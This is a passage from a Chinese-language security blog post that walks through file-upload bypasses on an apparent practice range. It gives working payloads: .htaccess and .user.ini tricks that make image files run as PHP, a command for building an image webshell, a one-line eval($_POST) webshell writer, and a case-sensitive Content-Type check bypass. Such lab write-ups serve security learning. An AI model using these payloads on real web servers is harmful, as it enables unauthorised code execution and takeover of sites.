+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php  //这个是所有文件都当php读取</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;IfModule mime_module&gt;</span><br><span class="line">AddType application/x-httpd-php .jpg    //这个是jpg-&gt;php</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在上传一个jpg文件</p>
+<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>先上传一个内容是的.user.ini文件</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=5.jpg</span><br></pre></td></tr></table></figure>
+
+<p>然后上传5.jpg文件,复制图像地址,将文件名改为readme.php</p>
+<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><p>​	图片马制作</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> zf.jpeg/b + zf.txt/a zf.jpg</span><br></pre></td></tr></table></figure>
+
+<p>​	直接上传zf.jpg文件利用文件包含漏洞访问,但是注意有时无法通过传参访问,可以通过访问写一个一句话木马上传14.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;zf.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">  <span class="title function_ invoke__">fputs</span>(<span class="variable">$file</span>,<span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>zf<span class="string">&#x27;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="修改-Content-Type-multipart-x2F-form-data-并更改文件名后缀为可上传的文件"><a href="#修改-Content-Type-multipart-x2F-form-data-并更改文件名后缀为可上传的文件" class="headerlink" title="修改 Content-Type : multipart&#x2F;form-data 并更改文件名后缀为可上传的文件"></a>修改 Content-Type : <strong>multipart&#x2F;form-data</strong> 并更改文件名后缀为可上传的文件</h2><p>​	首先上传一个jpg文件更改Content-Type:multipart&#x2F;form-data 为其中一个为大写及Content-Type:Multipart&#x2F;form-data绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$type</span>,“multipart/form-data”) !== False)</span><br></pre></td></tr></table></figure>
+
+<p>由于strpos()函数是区分大小写的所以此方法可以绕过.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allowexts = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由于是白名单所以只能上传php4为后缀的文件</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://aaanz.github.io">anz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://aaanz.github.io/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">https://aaanz.github.io/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://aaanz.github.io" target="_blank">anz</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post_share"><div class="social-share" data-image="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E9%9D%B6%E5%9C%BA/Java-sec-code/"><img class="prev-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java-sec-code</div></div></a></div><div class="next-post pull-right"><a href="/web/XXE/"><img class="next-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XXE</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">anz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aaanz"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to anz's blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%9E%E4%BA%89%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">竞争上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AF%E9%93%BE%E6%8E%A5%E4%BB%BB%E6%84%8F%E5%86%99-unzip"><span class="toc-number">1.1.</span> <span class="toc-text">软链接任意写(unzip)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AA%E8%A7%A3%E5%8E%8B%E4%B8%80%E5%8D%8A%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-%E8%A7%A3%E5%8E%8B%E5%87%BA%E9%94%99%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">只解压一半的压缩包(解压出错）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl%E7%BD%91%E7%AB%99%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">Perl网站配合文件上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload%E9%9D%B6%E5%9C%BA"><span class="toc-number"></span> <span class="toc-text">upload靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9content-type%E7%B1%BB%E5%9E%8B"><span class="toc-number"></span> <span class="toc-text">更改content-type类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%9C%AA%E7%A6%81%E6%AD%A2%E7%B1%BB%E5%9E%8B"><span class="toc-number"></span> <span class="toc-text">上传未禁止类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">.htaccess文件绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini"><span class="toc-number"></span> <span class="toc-text">.user.ini</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number"></span> <span class="toc-text">图片马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-Content-Type-multipart-x2F-form-data-%E5%B9%B6%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E7%BC%80%E4%B8%BA%E5%8F%AF%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">修改 Content-Type : multipart&#x2F;form-data 并更改文件名后缀为可上传的文件</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/web/miniL/" title="MiniL CTF"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MiniL CTF"/></a><div class="content"><a class="title" href="/web/miniL/" title="MiniL CTF">MiniL CTF</a><time datetime="2023-05-10T00:32:27.529Z" title="发表于 2023-05-10 08:32:27">2023-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="D3复现"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="D3复现"/></a><div class="content"><a class="title" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="D3复现">D3复现</a><time datetime="2023-05-03T08:27:47.715Z" title="发表于 2023-05-03 16:27:47">2023-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="红日二"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日二"/></a><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="红日二">红日二</a><time datetime="2023-04-20T07:14:49.281Z" title="发表于 2023-04-20 15:14:49">2023-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="权限维持"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="权限维持"/></a><div class="content"><a class="title" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="权限维持">权限维持</a><time datetime="2023-04-12T11:52:44.895Z" title="发表于 2023-04-12 19:52:44">2023-04-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Docker学习"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker学习"/></a><div class="content"><a class="title" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Docker学习">Docker学习</a><time datetime="2023-04-09T16:38:36.000Z" title="发表于 2023-04-10 00:38:36">2023-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By anz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
